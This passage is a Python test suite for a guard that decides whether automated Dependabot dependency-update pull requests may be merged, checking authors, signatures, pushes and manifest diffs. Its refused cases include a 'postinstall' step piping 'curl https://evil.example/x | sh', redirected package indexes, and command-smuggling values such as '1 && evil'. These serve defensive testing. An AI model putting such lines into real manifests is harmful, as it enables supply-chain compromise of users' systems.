# SPDX-FileCopyrightText: 2026 José M. Requena Plens
# SPDX-License-Identifier: MIT
"""landing.py: each guard refuses the pull request it is there for, and nothing lands past one."""

from __future__ import annotations

import copy
import dataclasses
import unittest
from typing import Any
from unittest import mock

from kit_fixtures import ecosystem, fast_forward, landing

SLUG = "kleidos-dev/boards"
HEAD, MAIN = "a" * 40, "c" * 40
OWNER = "someone"
BRANCH = "dependabot/pip/x-1.3.0"
MESSAGE = (
    "Bump x from 1.2.0 to 1.3.0\n\n---\nupdated-dependencies:\n- dependency-name: x\n"
    "  dependency-version: 1.3.0\n  update-type: version-update:semver-minor\n...\n"
)


def commit(message: str = MESSAGE, **more: Any) -> dict[str, Any]:
    return {
        "sha": HEAD,
        "author": {"login": fast_forward.BOT},
        "committer": {"login": "web-flow"},
        "parents": [{"sha": MAIN}],
        "commit": {"message": message, "verification": {"verified": True, "reason": "valid"}},
        **more,
    }


def pull(**more: Any) -> dict[str, Any]:
    repo = {"full_name": SLUG, "default_branch": "main"}
    return {
        "number": 7,
        "title": "Bump x",
        "draft": False,
        "state": "open",
        "html_url": "https://x/7",
        "user": {"login": fast_forward.BOT, "type": "Bot"},
        "head": {"sha": HEAD, "ref": BRANCH, "repo": dict(repo)},
        "base": {"ref": "main", "repo": dict(repo)},
        **more,
    }


def changed(
    name: str = "requirements.txt", patch: str = "@@\n-x==1\n+x==2", **more: Any
) -> dict[str, Any]:
    return {"filename": name, "status": "modified", "patch": patch, **more}


def push(actor: str = fast_forward.BOT, after: str = HEAD, kind: str = "push") -> dict[str, Any]:
    return {"activity_type": kind, "actor": {"login": actor}, "after": after}


class RefusalTest(unittest.TestCase):
    def why(
        self,
        of: dict[str, Any] | None = None,
        commits: list[dict[str, Any]] | None = None,
        files: list[dict[str, Any]] | None = None,
        pushes: list[dict[str, Any]] | None = None,
        read: bool = False,
    ) -> str:
        return str(
            landing.refusal(
                of or pull(),
                [commit()] if commits is None else commits,
                [changed()] if files is None else files,
                [push(kind="branch_creation")] if pushes is None else pushes,
                OWNER,
                read,
            )
        )

    def test_a_bots_minor_update_is_accepted(self) -> None:
        self.assertEqual(self.why(), "None")

    def test_who_opened_it_and_where_it_is(self) -> None:
        fork = {"full_name": "x/boards", "default_branch": "main"}
        for of, needle in (
            (pull(user={"login": OWNER, "type": "User"}), "opened by someone"),
            (pull(user={"login": "dependabot", "type": "User"}), "opened by dependabot"),
            (pull(user={"login": fast_forward.BOT, "type": "User"}), "opened by dependabot[bot]"),
            (pull(user={"login": "renovate[bot]", "type": "Bot"}), "opened by renovate"),
            (pull(head={"sha": HEAD, "repo": fork}), "not in this repository"),
            (pull(head={"sha": HEAD, "repo": None}), "not in this repository"),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(of))

    def test_who_wrote_the_commits(self) -> None:
        unsigned = commit()
        unsigned["commit"]["verification"] = {"verified": False, "reason": "unsigned"}
        for one, needle in (
            (unsigned, "is not signed by GitHub (unsigned)"),
            (commit(author={"login": OWNER}), "is someone's"),
            (commit(author={"login": "coderabbitai[bot]"}), "is coderabbitai[bot]'s"),
            (commit(author=None), "is None's"),
            (commit(committer={"login": OWNER}), "was not made on GitHub (someone)"),
            (commit(committer=None), "was not made on GitHub (None)"),
            (
                commit(author={"login": "app[bot]"}, parents=[{}, {}]),
                "is app[bot]'s",
            ),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(commits=[commit(), one]))
        self.assertIn(f"commit {HEAD[:7]} ", self.why(commits=[unsigned]))

    def test_the_merge_of_its_own_update_is_accepted(self) -> None:
        merge = commit("Merge main", author={"login": OWNER}, parents=[{}, {}])
        self.assertEqual(self.why(commits=[commit(), merge]), "None")
        self.assertIn("is someone's", self.why(commits=[commit("x", author={"login": OWNER})]))

    def test_a_foreign_commit_is_caught_wherever_it_is(self) -> None:
        for foreign in (
            commit(author={"login": "app[bot]"}),
            commit(author={"login": OWNER}),
            commit(committer={"login": "someone"}),
        ):
            for at in range(3):
                commits = [commit(), commit()]
                commits.insert(at, foreign)
                with self.subTest(at=at):
                    self.assertNotEqual(self.why(commits=commits), "None")
                    self.assertIn(f"commit {HEAD[:7]}", self.why(commits=commits))

    def test_who_pushed_to_its_branch(self) -> None:
        for pushes, needle in (
            ([push(kind="branch_creation"), push()], "None"),
            ([push(OWNER), push(after=MAIN)], "None"),
            ([push(), push("app[bot]", MAIN)], "push of its branch by app[bot]"),
            ([push("app[bot]", MAIN), push()], "push of its branch by app[bot]"),
            ([push("other", kind="force_push")], "force_push of its branch by other"),
            ([{"activity_type": "push", "actor": None, "after": HEAD}], "by None"),
            ([push(after=MAIN)], "its head is not on the record"),
            ([], "its head is not on the record"),
            ([push()] * 100, "too many pushes"),
            ([push()] * 99, "None"),
        ):
            with self.subTest(needle=needle):
                self.assertIn(needle, self.why(pushes=pushes))

    def test_which_files_are_read(self) -> None:
        sha = "d" * 40
        uses = f"@@\n-      - uses: a/b@{HEAD} # v1\n+      - uses: a/b@{sha} # v2"
        rev = "@@\n-    rev: v3.0.0\n+    rev: v3.1.0"
        json_patch = '@@\n-    "x": "1.0.0"\n+    "x": "1.0.1"'
        workflows = "proves nothing about a change under .github/"
        for one, needle in (
            (changed(), "None"),
            (changed("requirements-dev.in"), "None"),
            (changed("quality/requirements-tools.txt"), "None"),
            (changed("pyproject.toml", '@@\n-  "x==1",\n+  "x==2",'), "None"),
            (changed("a/package.json", json_patch), "None"),
            (changed("package-lock.json", json_patch), "None"),
            (changed(".github/workflows/ci.yml", uses), workflows),
            (changed(".github/requirements.txt"), workflows),
            (changed(".github/workflows/x", status="added"), workflows),
            (changed(".pre-commit-config.yaml", rev), "is no manifest"),
            (changed("action.yml", uses), "is no manifest"),
            (changed("scripts/deploy.sh.in"), "is no manifest"),
            (changed("Makefile.in"), "is no manifest"),
            (changed("requirements.txt/x.py"), "is no manifest"),
            (changed("requirements.txt.sh"), "is no manifest"),
            (changed("xrequirements.txt"), "is no manifest"),
            (changed("pyproject.toml.x"), "is no manifest"),
            (changed("pyprojectxtoml"), "is no manifest"),
            (changed("requirementsxtxt"), "is no manifest"),
            (changed("packagexjson", json_patch), "is no manifest"),
            (changed("xpyproject.toml"), "is no manifest"),
            (changed("xpackage.json", json_patch), "is no manifest"),
            (changed("package.json.js", json_patch), "is no manifest"),
            (changed("pnpm-lock.yaml"), "is no manifest"),
            (changed("pnpm-workspace.yaml"), "is no manifest"),
            (changed("uv.lock"), "is no manifest"),
            (changed("src/main.py"), "is no manifest"),
            (changed("requirements.txt", ""), "shows no diff"),
            (changed("requirements.txt", patch="@@ -1 +1 @@\n context"), "shows no diff"),
            ({"filename": "requirements.txt", "status": "modified"}, "shows no diff"),
            (changed("requirements.txt", status="added"), "is added"),
            (changed("requirements.txt", status="renamed"), "is renamed"),
        ):
            with self.subTest(file=one["filename"]):
                for files in ([changed(), one], [one, changed()]):
                    self.assertIn(needle, self.why(files=files))

    def lines(self, name: str, old: list[str], new: list[str]) -> bool:
        """Whether those lines in place of these are only versions."""
        patch = "\n".join(["@@ -1 +1 @@", " x", *(f"-{o}" for o in old), *(f"+{n}" for n in new)])
        return landing.file_refusal(changed(name, patch)) is None

    def test_what_a_line_of_requirements_may_change(self) -> None:
        one, two, three = (f"    --hash=sha256:{c * 64}" for c in "abc")
        for old, new, accepted in (
            (["x==1.0"], ["x==1.1"], True),
            (["x==1.0"], ["x==1.1.post1"], True),
            (["x[a]==1.0 ; python_version < '3.9'"], ["x[a]==1.1 ; python_version < '3.9'"], True),
            (["x==1.0 \\", one], ["x==1.1 \\", two], True),
            (["x==1.0 \\", one], ["x==1.1 \\", f"{two} \\", three], True),
            (["x==1.0 \\", f"{one} \\", two], ["x==1.1 \\", three], True),
            (["x==1.0", "    # via y"], ["x==1.1", "    # via z", "    # more"], True),
            (["x>=1,<2"], ["x>=1.5,<2"], True),
            (["x==1.0", "y==1"], ["x==1.1", "y==2"], True),
            (["x==1.0"], ["y==1.1"], False),
            (["x==1.0"], ["x>=1.1"], False),
            (["x==1.0"], ["x"], False),
            (["x==1.0"], ["x[evil]==1.1"], False),
            (["x==1.0"], ["x==1.1", "y==1.0"], False),
            (["x==1.0", "y==1.0"], ["x==1.1"], False),
            (["x==1.0", "y==1.0"], ["y==1.1", "x==1.1"], False),
            (["x==1.0"], ["x==1.1 --index-url https://evil.example"], False),
            (["x==1.0"], ["x==1.1", "--extra-index-url https://evil.example/simple"], False),
            (["x==1.0"], ["x @ https://evil.example/x-1.1.tar.gz"], False),
            (["x==1.0"], ["-r evil.txt"], False),
            (["x==1.0"], ["-e ."], False),
            (["x==1.0 \\", one], ["x==1.1"], False),
            ([f"x==1.0{one}"], [f"x==1.0{two}"], False),
            (["x==1.0 \\", one], ["x==1.1 \\", "    --hash=md5:" + "a" * 32], False),
            (["x==1.0 ; python_version < '3.9'"], ["x==1.1"], False),
            ([], ["y==1.0"], False),
            (["x==1.0"], [], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("requirements.txt", old, new), accepted)

    def test_what_a_line_of_pyproject_may_change(self) -> None:
        for old, new, accepted in (
            (['dependencies = ["x==1", "y>=2"]'], ['dependencies = ["x==2", "y>=3"]'], True),
            (['requires = ["setuptools==80"]'], ['requires = ["setuptools==81"]'], True),
            ([], ["[tool.pytest.ini_options]", 'addopts = "-p evil"'], False),
            (['build-backend = "a"'], ['build-backend = "evil"'], False),
            (['  "x==1",'], ['  "x @ https://evil.example/x==2",'], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("pyproject.toml", old, new), accepted)

    def test_what_a_line_of_npm_may_change(self) -> None:
        def entry(version: str = "1.0.0", host: str = "registry.npmjs.org", **of: str) -> list[str]:
            name = of.get("name", "@a/b-2")
            base = name.rpartition("/")[2]
            return [
                f'    "node_modules/{name}": {{',
                f'      "version": "{version}",',
                f'      "resolved": "https://{host}/{name}/-/{base}-{version}.tgz",',
                f'      "integrity": "{of.get("hash", "sha512")}-{of.get("fill", "A") * 86}==",',
            ]

        def sha(fill: str, more: str = "") -> str:
            return f'"integrity": "sha512-{fill * 86}=="{more}'

        def ranges(value: str) -> list[str]:
            return [f'        "undici-types": "{value}"']

        for old, new, accepted in (
            (entry(), entry("1.1.0", fill="B"), True),
            (entry(), entry("1.1.0-rc.1", fill="+"), True),
            (entry(), entry("1.1.0-rc.1", fill="/"), True),
            ([sha("A")], [sha("B")], True),
            ([sha("A", ', "x": 1')], [sha("B", ', "x": 1')], False),
            ([sha("A").replace("==", "=")], [sha("B").replace("==", "=")], False),
            (ranges(">=7.24.0 <7.24.7"), ranges("~8.9.0"), True),
            (ranges("^1.0.0"), ranges("^1.1.0 || >= 2"), True),
            (ranges("1.0.0 - 2.0.0"), ranges("*"), True),
            (['    "x": "1.0.0",'], ['    "x": "1.0.1"'], False),
            (entry(), entry("1.1.0", "evil.example"), False),
            (entry(), entry("1.1.0", "registry.npmjs.org.evil.example"), False),
            (entry(), entry("1.1.0", name="@a/evil"), False),
            (entry(), entry("1.1.0", hash="sha1"), False),
            (entry(), entry("1.1.0")[:3], False),
            (entry(), [*entry("1.1.0"), '      "hasInstallScript": true,'], False),
            (entry(), [*entry("1.1.0"), '      "license": "other",'], False),
            (['      "license": "MIT",'], ['      "license": "BUSL-1.1",'], False),
            (ranges("1.0.0"), ranges("npm:evil@1.0.0"), False),
            (ranges("1.0.0"), ranges("git+ssh://git@evil.example/x"), False),
            (ranges("1.0.0"), ranges("file:../evil"), False),
            (ranges("1.0.0"), ranges("evil/x"), False),
            (ranges("1.0.0"), ranges("latest"), False),
            (ranges("1.0.0"), ['        "evil": "1.0.0"'], False),
            ([], ['    "postinstall": "curl https://evil.example/x | sh",'], False),
            (['    "test": "vitest"'], ['    "test": "evil"'], False),
            (['    "test": "1"'], ['    "test": "1 && evil"'], False),
            (["      # x"], ["      # y"], False),
        ):
            with self.subTest(old=old, new=new):
                self.assertIs(self.lines("package.json", old, new), accepted)
                self.assertIs(self.lines("package-lock.json", old, new), accepted)

    def test_a_floor_or_an_index_is_never_landed(self) -> None:
        """What a check holds the code to, and where packages come from, are a person's to move."""
        for name, old, new in (
            ("pyproject.toml", "fail_under = 90", "fail_under = 50"),
            ("pyproject.toml", "fail-under = 90", "fail-under = 0"),
            ("pyproject.toml", 'addopts = "--cov-fail-under=90"', 'addopts = "--cov-fail-under=9"'),
            ("pyproject.toml", 'requires-python = ">=3.12"', 'requires-python = ">=3.9"'),
            ("pyproject.toml", 'requires-python = ">=3.12,<4"', 'requires-python = ">=3.9,<4"'),
            ("pyproject.toml", 'python_requires = ">=3.12"', 'python_requires = ">=3.8"'),
            ("pyproject.toml", "[[tool.uv.index]]", "[[tool.uv.index]]  # moved"),
            (
                "requirements.txt",
                "--index-url https://pypi.org/simple",
                "--index-url https://10.0.0.1/simple",
            ),
            ("requirements.txt", "--index-url=10.0.0.1", "--index-url=10.0.0.2"),
            ("requirements.txt", "-i https://a.example:1/simple", "-i https://a.example:2/simple"),
            (
                "requirements.in",
                "--extra-index-url https://a.example/1",
                "--extra-index-url https://a.example/2",
            ),
            (
                "requirements.txt",
                "--find-links https://a.example/1",
                "--find-links https://a.example/2",
            ),
            ("requirements.txt", "--trusted-host 10.0.0.1", "--trusted-host 10.0.0.2"),
            ("requirements.txt", "-c constraints-1.txt", "-c constraints-2.txt"),
            ("package.json", '    "node": ">=20",', '    "node": ">=16",'),
            ("package.json", '    "npm": ">=10"', '    "npm": ">=6"'),
            ("package.json", '    "pnpm": ">=9"', '    "pnpm": ">=8"'),
            ("package.json", '    "yarn": ">=4"', '    "yarn": ">=1"'),
            ("package.json", '    "bun": ">=1.1"', '    "bun": ">=1.0"'),
            ("package.json", '  "engines": { "node": ">=20" },', '  "engines": { "node": ">=8" },'),
            (
                "package.json",
                '    "registry": "https://registry.npmjs.org/"',
                '    "registry": "https://a.example/"',
            ),
            (
                "package.json",
                '  "packageManager": "pnpm@9.0.0",',
                '  "packageManager": "pnpm@8.0.0",',
            ),
            # Poetry's and uv's spellings of a floor.
            ("pyproject.toml", 'python = "<4,>=3.12"', 'python = "<4,>=3.8"'),
            ("pyproject.toml", 'required-version = ">=0.5,<1"', 'required-version = ">=0.5,<0.1"'),
            ("pyproject.toml", "Fail_Under = 90", "Fail_Under = 10"),
        ):
            version = '  "x==1",' if name == "pyproject.toml" else "x==1"
            if name == "package.json":
                version = '    "a": "^1.0.0",'
            bumped = (
                version.replace("1", "2", 1) if name != "package.json" else '    "a": "^1.1.0",'
            )
            first = f"@@ -1 +1 @@\n-{version}\n+{bumped}"
            floor = f"@@ -40 +40 @@\n-{old}\n+{new}"
            for patch in (
                floor,
                f"{first}\n{floor}",
                f"{first}\n context\n{floor[floor.index(chr(10)) + 1 :]}",
            ):
                with self.subTest(name=name, old=old, patch=patch.count("@@")):
                    why = landing.file_refusal(changed(name, patch))
                    self.assertEqual(
                        why, f"{name} changes a floor or a package index: {new.strip()[:80]}"
                    )
            with self.subTest(name=name, only="the version"):
                self.assertIsNone(landing.file_refusal(changed(name, first)))

    def test_a_floor_a_lock_records_for_a_dependency_moves_with_it(self) -> None:
        patch = (
            '@@\n-      "version": "1.0.0",\n+      "version": "1.1.0",'
            '\n-        "node": ">=14"\n+        "node": ">=18"'
        )
        self.assertIsNone(landing.file_refusal(changed("package-lock.json", patch)))
        self.assertIsNotNone(landing.file_refusal(changed("package.json", patch)))

    def test_only_a_packages_own_version_is_masked(self) -> None:
        for line, masked in (
            ("x==1.0", "x==…"),
            ("x[a,b] >= 1.0", "x[a,b] >= …"),
            ('  "x>=1,<2",', '  "x>=…,<…",'),
            ("fail_under = 90", "fail_under = 90"),
            ("--cov-fail-under=90", "--cov-fail-under=90"),
            ('requires-python = ">=3.12"', 'requires-python = ">=3.12"'),
            ("x = 1", "x = 1"),
            ("--index-url=10.0.0.1", "--index-url=10.0.0.1"),
            ("x>=1, <2, !=1.5", "x>=…, <…, !=…"),
            ('python = "<4,>=3.12"', 'python = "<4,>=3.12"'),
            ('required-version = ">=0.5,<1"', 'required-version = ">=0.5,<1"'),
            ("--x==1", "--x==1"),  # an option's value, not a package's version
            ("zope.interface==5.0", "zope.interface==…"),
        ):
            with self.subTest(line=line):
                self.assertEqual(landing.masked(line, landing.PYTHON), masked)

    def test_a_floor_taken_away_is_never_landed(self) -> None:
        for name, line in (
            ("pyproject.toml", "fail_under = 90"),
            ("requirements.txt", "--index-url https://pypi.org/simple"),
            ("package.json", '    "node": ">=20",'),
        ):
            with self.subTest(name=name):
                why = landing.file_refusal(changed(name, f"@@ -40 +40 @@\n-{line}"))
                self.assertEqual(why, f"{name} changes a floor or a package index: {line.strip()}")

    def test_a_version_in_package_json_is_one_of_a_package_the_update_names(self) -> None:
        """Every child of engines is a floor, whatever the engine: no update names it."""
        names = frozenset({"a", "@b/c"})
        for old, new, refused in (
            ('    "a": "^1.0.0",', '    "a": "^1.1.0",', ""),
            ('    "@b/c": "~2.0.0"', '    "@b/c": "~2.1.0"', ""),
            ('    "vscode": "^1.90.0"', '    "vscode": "^1.0.0"', "vscode"),
            ('    "deno": ">=2",', '    "deno": ">=1",', "deno"),
            ('  "version": "1.0.0",', '  "version": "1.0.1",', "version"),
            ('    "b": "^1.0.0",', '    "b": "^1.1.0",', "b"),
        ):
            with self.subTest(new=new):
                patch = f"@@ -1 +1 @@\n-{old}\n+{new}"
                why = landing.file_refusal(changed("package.json", patch), names)
                wanted = f"changes {refused}, which no update of it names: {old.strip()}"
                self.assertEqual(why, f"package.json {wanted}" if refused else None)
                self.assertIsNone(landing.file_refusal(changed("package-lock.json", patch), names))
        patch = '@@\n-    "vscode": "^1.90.0"\n+    "vscode": "^1.0.0"'
        self.assertIn("changes vscode", self.why(files=[changed("package.json", patch)]))
        patch = '@@\n-    "x": "^1.2.0"\n+    "x": "^1.3.0"'
        self.assertIsNone(
            landing.refusal(pull(), [commit()], [changed("package.json", patch)], [push()], OWNER)
        )

    def test_a_scoped_package_dependabot_quotes_is_named(self) -> None:
        """Dependabot quotes a scoped name in its commit (kleidos-dev/cla#1): the name is inside."""
        message = (
            "Bump @types/node from 22.19.1 to 22.19.2 in /worker\n\n"
            "Bumps [@types/node](https://github.com/DefinitelyTyped/DefinitelyTyped) "
            "from 22.19.1 to 22.19.2.\n\n---\nupdated-dependencies:\n"
            '- dependency-name: "@types/node"\n  dependency-version: 22.19.2\n'
            "  dependency-type: direct:development\n"
            "  update-type: version-update:semver-patch\n...\n\n"
            "Signed-off-by: dependabot[bot] <support@github.com>\n"
        )
        patch = '@@\n-    "@types/node": "^22.19.1",\n+    "@types/node": "^22.19.2",'
        files = [changed("worker/package.json", patch)]
        self.assertIsNone(landing.refusal(pull(), [commit(message)], files, [push()], OWNER))
        for name, named in (
            ('"@types/node"', True),
            ("'@types/node'", True),
            ("@types/node", True),
            ('"@types/node', False),
            ("\"@types/node'", False),
            ('"@types/other"', False),
        ):
            with self.subTest(name=name):
                text = message.replace('"@types/node"', name, 1)
                why = landing.refusal(pull(), [commit(text)], files, [push()], OWNER)
                if named:
                    self.assertIsNone(why)
                else:
                    self.assertIn("changes @types/node, which no update of it names", str(why))

    def test_lines_apart_are_compared_apart(self) -> None:
        for patch, accepted in (
            ("@@\n-x==1\n+x==2\n y==1\n-z==1\n+z==2", True),
            ("@@\n-x==1\n c\n+x==2", False),
            ("@@\n-x==1\n y==1\n+z==2\n@@\n-z==1\n+x==2", False),
            ("@@\n-x==1\n\\ No newline at end of file\n+x==2\n\\ No newline", True),
        ):
            with self.subTest(patch=patch):
                self.assertIs(landing.file_refusal(changed(patch=patch)) is None, accepted)

    def test_what_is_said_of_a_line(self) -> None:
        patch = "@@\n-x==1\n+x==2\n+--index-url evil " + "y" * 99
        why = str(landing.file_refusal(changed(patch=patch)))
        self.assertTrue(
            why.startswith(
                "requirements.txt changes a floor or a package index: --index-url evil y"
            ),
            why,
        )
        self.assertLess(len(why), 140)
        self.assertIn("a version: x==…", str(landing.file_refusal(changed(patch="@@\n-x==1"))))
        moved = landing.file_refusal(changed(patch="@@\n-x==1\n-y==1\n+y==1\n+x==1"))
        self.assertIn("a version: x==…", str(moved))

    def test_what_the_versions_are(self) -> None:
        def update(*levels: str) -> str:
            return "".join(
                f"- dependency-name: {n}\n  update-type: version-update:semver-{level}\n"
                for n, level in enumerate(levels)
            )

        for message, needle in (
            (update("minor"), "None"),
            (update("patch", "minor", "patch"), "None"),
            (update("major"), "holds a major"),
            (update("patch", "major"), "holds a major"),
            ("Bump x", f"commit {HEAD[:7]} does not say"),
            (update("minor").replace("  update-type", "update-type"), "does not say"),
            (update("minor").replace("- dependency", " - dependency"), "does not say"),
            (update("minor").replace("semver-minor", "semver-minor x"), "does not say"),
            (update("minor") + "- dependency-name: y\n", "does not say"),
            (update("minor") + "  update-type: version-update:semver-minor\n", "does not say"),
            ("", "does not say"),
        ):
            with self.subTest(message=message):
                self.assertIn(needle, self.why(commits=[commit(message)]))

    def test_each_commit_says_its_own_versions(self) -> None:
        for commits in ([commit(), commit("Bump y")], [commit("Bump y"), commit()]):
            self.assertIn("does not say", self.why(commits=commits))
        major = MESSAGE.replace("minor", "major")
        for commits in ([commit(), commit(major)], [commit(major), commit()]):
            self.assertIn("holds a major", self.why(commits=commits))

    def test_a_merge_commit_says_nothing_of_the_versions(self) -> None:
        merge = commit(MESSAGE, author={"login": OWNER}, parents=[{}, {}])
        self.assertIn("does not say", self.why(commits=[commit("Bump x"), merge]))

    def test_what_is_too_large_or_empty(self) -> None:
        self.assertIn("too large", self.why(commits=[commit()] * 100))
        self.assertIn("too large", self.why(files=[changed()] * 100))
        self.assertEqual(self.why(commits=[commit()] * 99, files=[changed()] * 99), "None")
        self.assertIn("changes nothing", self.why(files=[]))
        self.assertIn("changes nothing", self.why(commits=[]))

    def test_one_a_person_read_is_held_to_who_wrote_it(self) -> None:
        workflow = [changed(".github/workflows/x.yml")]
        unsaid = [commit("Bump the hooks group")]
        self.assertEqual(self.why(commits=unsaid, files=workflow, read=True), "None")
        self.assertIn("proves nothing", self.why(files=workflow))
        self.assertIn("does not say what", self.why(commits=unsaid))
        for needle, change in (
            ("is app[bot]'s", {"commits": [commit(author={"login": "app[bot]"})]}),
            ("push of its branch by app[bot]", {"pushes": [push("app[bot]")]}),
            ("opened by someone", {"of": pull(user={"login": OWNER, "type": "User"})}),
            ("changes nothing", {"files": []}),
            ("too large", {"files": workflow * 100}),
        ):
            with self.subTest(needle=needle):
                given: dict[str, Any] = {"commits": unsaid, "files": workflow, **change}
                self.assertIn(needle, self.why(**given, read=True))


class FakeApi(fast_forward.Api):
    """GitHub as one pull request of Dependabot's, and the one that takes it."""

    def __init__(self) -> None:
        self.pull = pull()
        self.commits = [commit()]
        self.files = [changed()]
        self.taken_files = [changed()]
        self.pushes = [push(), push(OWNER, "b" * 40)]
        self.ahead = 0
        self.gets: list[str] = []
        self.refuse = ""

    def get(self, path: str) -> Any:
        self.gets.append(path)
        if self.refuse and self.refuse in path:
            raise fast_forward.ApiError("refused")
        base = f"repos/{SLUG}"
        if path == "user":
            return {"login": OWNER}
        if path == f"{base}/pulls?state=open&per_page=100&direction=asc":
            return [{"number": 7}]
        if path == f"{base}/pulls/7":
            return copy.deepcopy(self.pull)
        if path.startswith(f"{base}/pulls/7/commits?per_page=100"):
            return copy.deepcopy(self.commits)
        if path.startswith(f"{base}/pulls/7/files?per_page=100"):
            return copy.deepcopy(self.files)
        if path == f"{base}/pulls/101/files?per_page=100&page=1":
            return copy.deepcopy(self.taken_files)
        if path == f"{base}/activity?ref=refs%2Fheads%2Fdependabot%2Fpip%2Fx-1.3.0&per_page=100":
            return self.pushes
        if path == f"{base}/compare/main...{MAIN}":
            return {"ahead_by": self.ahead}
        raise AssertionError(f"not asked for: {path}")


class StubLander(landing.Lander):
    """The walk, with what fast_forward.py does written down instead of done."""

    landed = True

    def __init__(self, api: FakeApi, merge: bool, said: list[str]) -> None:
        super().__init__(api, fast_forward.Git(), merge, say=said.append)
        self.did: list[tuple[str, int, str]] = []

    def take(self, slug: str, pull: dict[str, Any]) -> dict[str, Any] | None:
        self.did.append(("take", pull["number"], slug))
        return {**pull, "number": 101, "title": "Taken"} if self.merge else None

    def own(self, slug: str, pull: dict[str, Any], read: str = "") -> bool:
        self.did.append(("own", pull["number"], read))
        return self.landed

    def person(self, slug: str, pull: dict[str, Any], read: str = "") -> bool:
        self.did.append(("person", pull["number"], read))
        return self.landed


class LanderTest(unittest.TestCase):
    def setUp(self) -> None:
        self.api = FakeApi()
        self.said: list[str] = []
        self.stub = StubLander(self.api, True, self.said)

    def land(self, *only: str, read: str = "", merge: bool = True) -> int:
        self.stub.merge = merge
        return landing.land(ecosystem.load(), list(only or [SLUG]), merge, self.stub, read)

    def test_an_update_is_taken_and_lands(self) -> None:
        self.assertEqual(self.land(), 0)
        self.assertEqual(self.stub.did, [("take", 7, SLUG), ("own", 101, "")])
        self.assertEqual(self.said, [])

    def test_a_dry_run_takes_and_lands_nothing(self) -> None:
        for only in (SLUG, f"{SLUG}#7"):
            self.stub.did.clear()
            self.assertEqual(self.land(only, merge=False), 0)
            self.assertEqual(self.stub.did, [("take", 7, SLUG)])

    def test_a_guard_that_fails_leaves_it(self) -> None:
        for change, needle in (
            ({"files": [changed("src/x.py")]}, "is no manifest"),
            ({"pushes": [push("app[bot]"), push()]}, "push of its branch by app[bot]"),
            ({"pull": pull(draft=True)}, "a draft"),
            ({"pull": pull(state="closed")}, "it is not open"),
            ({"pull": pull(user={"login": OWNER, "type": "User"})}, "opened by someone"),
        ):
            with self.subTest(needle=needle):
                self.api = FakeApi()
                self.said.clear()
                self.stub = StubLander(self.api, True, self.said)
                for name, value in change.items():
                    setattr(self.api, name, value)
                self.assertEqual(self.land(), 0)
                self.assertEqual(self.stub.did, [])
                self.assertRegex(self.said[0], f"^left: {SLUG}#7 Bump x: ")
                self.assertIn(needle, self.said[0])

    def test_a_merge_of_something_else_is_left(self) -> None:
        merge = commit("Merge", author={"login": OWNER}, parents=[{"sha": HEAD}, {"sha": MAIN}])
        self.api.commits = [commit(), merge]
        self.land()
        self.assertEqual(len(self.stub.did), 2)
        self.api.ahead = 1
        self.land()
        self.assertEqual(len(self.stub.did), 2)
        self.assertIn(f"commit {HEAD[:7]} merges what is not on main", self.said[0])

    def test_what_was_taken_changes_no_more_than_the_bots(self) -> None:
        for files, needle in (
            ([changed(), changed("src/x.py")], "src/x.py is no manifest"),
            ([changed("package.json", '@@\n-  "y": "1.0.0",\n+  "y": "2.0.0",')], "no update"),
        ):
            self.stub.did.clear()
            self.said.clear()
            self.api.taken_files = files
            self.land()
            self.assertEqual(self.stub.did, [("take", 7, SLUG)])
            self.assertRegex(self.said[0], f"^left: {SLUG}#101 Taken: ")
            self.assertIn(needle, self.said[0])
        self.api.taken_files = [changed("package.json", '@@\n-  "x": "1.0.0"\n+  "x": "2.0.0"')]
        self.land()
        self.assertEqual(self.stub.did[-1], ("own", 101, ""))

    def test_one_a_person_read_whole_is_only_taken(self) -> None:
        self.api.files = [changed(".github/workflows/x.yml")]
        for read in ("", "f" * 40):
            self.assertEqual(self.land(f"{SLUG}#7", read=read), 1)
            self.assertEqual(self.stub.did, [])
        self.land(f"{SLUG}#7", read=HEAD)
        self.assertEqual(self.stub.did, [("take", 7, SLUG)])
        self.api.commits = [commit(author={"login": "app[bot]"})]
        self.land(f"{SLUG}#7", read=HEAD)
        self.assertEqual(len(self.stub.did), 1)

    def test_one_that_is_named_goes_where_it_belongs(self) -> None:
        here = {"full_name": SLUG, "default_branch": "main"}
        fork = {**here, "full_name": "x/boards"}
        for user, repo, did in (
            ({"login": "jmrplens", "type": "User"}, here, ("own", 7, "r")),
            ({"login": "jmrplens", "type": "User"}, fork, ("person", 7, "r")),
            ({"login": "x", "type": "User"}, here, ("person", 7, "r")),
        ):
            self.stub.did.clear()
            self.api.pull = pull(user=user, head={"sha": HEAD, "ref": "t", "repo": repo})
            self.assertEqual(self.land(f"{SLUG}#7", read="r"), 0)
            self.assertEqual(self.stub.did, [did])
        self.stub.did.clear()
        self.api.pull = pull(user={"login": "renovate[bot]", "type": "Bot"})
        self.assertEqual(self.land(f"{SLUG}#7"), 1)
        self.assertEqual(self.said, [f"left: {SLUG}#7 Bump x: opened by a bot: renovate[bot]"])
        self.assertEqual(self.stub.did, [])

    def test_naming_one_walks_nothing(self) -> None:
        self.land(f"{SLUG}#7")
        self.assertFalse([path for path in self.api.gets if "pulls?" in path])
        self.assertEqual(self.stub.did, [("take", 7, SLUG), ("own", 101, "")])
        self.stub.did.clear()
        self.land(f"{SLUG}#7", SLUG)
        self.assertEqual(len(self.stub.did), 4)

    def test_one_named_that_does_not_land_fails(self) -> None:
        self.stub.landed = False
        self.assertEqual(self.land(f"{SLUG}#7"), 1)
        self.assertEqual(self.land(), 0)
        self.assertEqual(self.land(f"{SLUG}#7", merge=False), 0)

    def test_the_kits_own_land_by_name_and_its_bots_by_hand(self) -> None:
        kit = ecosystem.load().kit
        seen: list[tuple[Any, ...]] = []

        def land(*args: Any) -> bool:
            seen.append(args)
            return True

        with mock.patch.object(self.stub, "land", land):
            self.assertEqual(self.land(f"{kit}#3", read="r"), 0)
            self.land(f"{SLUG}#4")
        self.assertEqual(seen, [(kit, 3, True, "r"), (SLUG, 4, False, "")])
        self.assertFalse(self.stub.land(SLUG, 7, True, ""))
        self.assertIn("opened by a bot: the kit's releases are made by hand", self.said[-1])
        self.assertEqual(self.stub.did, [])

    def test_what_is_not_declared_is_refused_before_anything(self) -> None:
        for one in ("x/y", "x/y#3", f"{SLUG}#", f"{SLUG}#x", f"{SLUG}#-1", "boards#7"):
            self.said.clear()
